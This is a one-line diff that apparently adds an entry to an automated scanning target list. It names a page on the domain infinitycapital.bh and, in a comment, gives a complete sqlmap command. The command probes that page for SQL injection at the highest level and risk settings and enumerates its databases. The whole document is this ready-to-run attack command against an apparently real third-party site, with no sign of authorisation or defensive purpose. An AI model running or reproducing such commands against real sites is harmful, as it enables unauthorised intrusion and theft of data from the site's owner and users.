@@ -1,0 +1,1 @@
+https://www.infinitycapital.bh/404 (GET)  # /usr/bin/sqlmap -u https://www.infinitycapital.bh/404 --batch --level=5 --risk=3 --dbs --threads=4 --output-dir=tool_outputs/ph/sm_13 -p id --technique=BEUSTQ --skip-heuristic
